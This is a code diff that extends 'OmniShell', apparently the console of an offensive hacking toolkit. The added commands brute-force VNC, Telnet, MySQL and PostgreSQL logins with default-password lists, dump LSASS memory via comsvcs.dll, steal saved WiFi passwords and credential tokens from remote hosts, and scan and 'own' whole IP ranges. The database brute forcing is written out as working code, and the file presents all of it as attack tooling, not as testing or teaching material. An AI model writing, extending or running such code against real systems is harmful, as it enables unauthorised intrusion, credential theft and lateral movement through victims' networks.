@@ -29,16 +29,27 @@ logging.basicConfig(
 logger = logging.getLogger("Omniscience.OmniShell")
 
 # Robust Module Loading Utility
+_MODULE_MAP = {
+    "1": "network_discovery",
+    "2": "passive_intel",
+    "3": "remote_control",
+    "5": "advanced_scanner",
+    "6": "lateral_movement",
+    "7": "exploit_engine",
+}
+
 def get_module(name):
     try:
         import importlib.util
-        if os.path.exists(f"{name}.py"):
-            spec = importlib.util.spec_from_file_location(f"mod_{name}", f"{name}.py")
-            module = importlib.util.module_from_spec(spec)
-            spec.loader.exec_module(module)
-            return module
+        filename = _MODULE_MAP.get(str(name), name)
+        for candidate in [filename, name]:
+            if os.path.exists(f"{candidate}.py"):
+                spec = importlib.util.spec_from_file_location(f"mod_{candidate}", f"{candidate}.py")
+                module = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(module)
+                return module
     except Exception as e:
-        logger.error(f"Failed to load {name}.py: {e}")
+        logger.error(f"Failed to load module '{name}': {e}")
     return None
 
 # Visualizer Class
@@ -1036,6 +1047,174 @@ class OmniShell:
                 if self.control and hasattr(self.control, 'rdp_brute_force'):
                     result = self.control.rdp_brute_force(args[0])
                     print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "vnc-brute" and args:
+                if self.control and hasattr(self.control, 'vnc_brute_force'):
+                    result = self.control.vnc_brute_force(args[0])
+                    print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "telnet-brute" and args:
+                if self.control and hasattr(self.control, 'telnet_brute_force'):
+                    result = self.control.telnet_brute_force(args[0])
+                    print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "steal-wifi" or cmd == "steal_wifi":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
+                    return
+                Visualizer.alert(f"Extracting WiFi passwords from {target} ...", "hack")
+                if self.control and hasattr(self.control, 'get_wifi_passwords'):
+                    result = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"])
+                    networks = result.get("networks", {})
+                    if networks:
+                        print(f"\n  {Fore.CYAN}{Style.BRIGHT}WiFi Passwords harvested from {target}:")
+                        print(f"  {Fore.BLUE}{'─'*50}")
+                        for ssid, pw in networks.items():
+                            print(f"  {Fore.GREEN}{Style.BRIGHT}  {ssid:<30} {Fore.WHITE}→ {pw}")
+                        print(f"  {Fore.BLUE}{'─'*50}\n")
+                    else:
+                        print(f"  {Fore.YELLOW}No WiFi profiles found or no permission.")
+                    if result.get("error"):
+                        print(f"  {Fore.RED}Error: {result['error']}")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+
+            elif cmd == "lsass-dump":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'lsass-dump <ip>'.")
+                    return
+                Visualizer.alert(f"Dumping LSASS on {target} via comsvcs.dll MiniDump ...", "hack")
+                if self.control and hasattr(self.control, 'lsass_dump'):
+                    result = self.control.lsass_dump(target, self.credentials["user"], self.credentials["pass"])
+                    if result.get("success"):
+                        print(f"\n  {Fore.RED}{Style.BRIGHT}✔  LSASS Dumped Successfully")
+                        print(f"  {Fore.WHITE}  Remote path : {result['path']}")
+                        print(f"  {Fore.WHITE}  UNC path    : {result['unc']}")
+                        print(f"  {Fore.WHITE}  Size        : {result.get('size_bytes','?')} bytes")
+                        print(f"\n  {Fore.YELLOW}  Use SMB download to retrieve: smb-download {target} C$ Windows/Temp/lsass.dmp\n")
+                    else:
+                        print(f"\n  {Fore.RED}✘  LSASS dump failed: {result.get('error','unknown')}\n")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+
+            elif cmd == "tokens":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'tokens <ip>'.")
+                    return
+                Visualizer.alert(f"Harvesting auth tokens from {target} ...", "hack")
+                if self.control and hasattr(self.control, 'steal_saved_credentials'):
+                    result = self.control.steal_saved_credentials(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"{Fore.CYAN}\n  Token/Credential harvest results:")
+                    print(json.dumps(result, indent=2))
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+
+            elif cmd == "mysql-root" and args:
+                target = args[0]
+                Visualizer.alert(f"Trying MySQL root access on {target}:3306 ...", "hack")
+                result = {"target": target, "port": 3306, "attempts": []}
+                try:
+                    import pymysql
+                    for pw in ["", "root", "password", "admin", "mysql", "toor", "123456"]:
+                        try:
+                            conn = pymysql.connect(host=target, user='root', password=pw, connect_timeout=3, db='information_schema')
+                            cur = conn.cursor()
+                            cur.execute("SELECT user, host, authentication_string FROM mysql.user")
+                            users = cur.fetchall()
+                            result["success"] = True
+                            result["password"] = pw if pw else "(empty)"
+                            result["users"] = [{"user": r[0], "host": r[1]} for r in users]
+                            cur.execute("SHOW DATABASES")
+                            result["databases"] = [r[0] for r in cur.fetchall()]
+                            conn.close()
+                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  MySQL root ACCESS on {target}  │  password='{pw if pw else '(empty)'}'")
+                            print(f"  {Fore.WHITE}  Databases: {', '.join(result['databases'])}")
+                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
+                            break
+                        except Exception as e2:
+                            result["attempts"].append({"password": pw or "(empty)", "error": str(e2)})
+                    if not result.get("success"):
+                        print(f"  {Fore.GREEN}MySQL root access failed — all passwords rejected.")
+                except ImportError:
+                    try:
+                        s = socket.socket()
+                        s.settimeout(3)
+                        r = s.connect_ex((target, 3306))
+                        s.close()
+                        state = "OPEN" if r == 0 else "CLOSED"
+                        print(f"\n  {Fore.YELLOW}  MySQL port 3306: {state} (install pymysql for full exploit)\n")
+                        result["port_state"] = state
+                    except Exception as e:
+                        result["error"] = str(e)
+                print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "postgres" and args:
+                target = args[0]
+                Visualizer.alert(f"Trying PostgreSQL access on {target}:5432 ...", "hack")
+                result = {"target": target, "port": 5432, "attempts": []}
+                try:
+                    import psycopg2
+                    for user_pw in [("postgres",""), ("postgres","postgres"), ("postgres","password"), ("admin","admin")]:
+                        u, pw = user_pw
+                        try:
+                            conn = psycopg2.connect(host=target, user=u, password=pw, dbname='postgres', connect_timeout=3)
+                            cur = conn.cursor()
+                            cur.execute("SELECT usename, usesuper FROM pg_user")
+                            users = cur.fetchall()
+                            cur.execute("SELECT datname FROM pg_database WHERE datistemplate=false")
+                            dbs = [r[0] for r in cur.fetchall()]
+                            result["success"] = True
+                            result["user"] = u
+                            result["password"] = pw if pw else "(empty)"
+                            result["databases"] = dbs
+                            result["users"] = [{"user":r[0],"superuser":r[1]} for r in users]
+                            conn.close()
+                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  PostgreSQL ACCESS on {target}  │  {u}:'{pw if pw else '(empty)'}'")
+                            print(f"  {Fore.WHITE}  Databases: {', '.join(dbs)}")
+                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
+                            break
+                        except Exception as e2:
+                            result["attempts"].append({"user": u, "password": pw or "(empty)", "error": str(e2)})
+                    if not result.get("success"):
+                        print(f"  {Fore.GREEN}PostgreSQL access failed — all credentials rejected.")
+                except ImportError:
+                    try:
+                        s = socket.socket()
+                        s.settimeout(3)
+                        r = s.connect_ex((target, 5432))
+                        s.close()
+                        state = "OPEN" if r == 0 else "CLOSED"
+                        print(f"\n  {Fore.YELLOW}  PostgreSQL port 5432: {state} (install psycopg2 for full exploit)\n")
+                        result["port_state"] = state
+                    except Exception as e:
+                        result["error"] = str(e)
+                print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "scan-exploit" and args:
+                ip_range = args[0]
+                Visualizer.alert(f"Scan & exploit all hosts in {ip_range} ...", "hack")
+                if self.control and hasattr(self.control, 'scan_and_exploit_network'):
+                    result = self.control.scan_and_exploit_network(ip_range)
+                    total = result.get("total_scanned", 0)
+                    owned = result.get("owned", 0)
+                    print(f"\n  {Fore.RED}{Style.BRIGHT}Scan-Exploit complete:")
+                    print(f"  {Fore.WHITE}  Hosts scanned : {total}")
+                    print(f"  {Fore.GREEN}{Style.BRIGHT}  Owned         : {owned}")
+                    hosts = result.get("hosts", [])
+                    for h in hosts:
+                        col = Fore.RED if h.get("owned") else Fore.WHITE
+                        print(f"  {col}  {h.get('ip','?'):<16} {h.get('method','')}")
+                    print()
+                elif self.universal:
+                    result = self.universal.discover_all_devices(ip_range)
+                    print(f"\n  Found {len(result)} hosts in {ip_range}")
+                    for d in result:
+                        print(f"  {Fore.CYAN}  {d.ip:<16} {getattr(d,'hostname','') or ''}")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
 
             # ==================== WIN10/11 EXPLOITS ====================
 
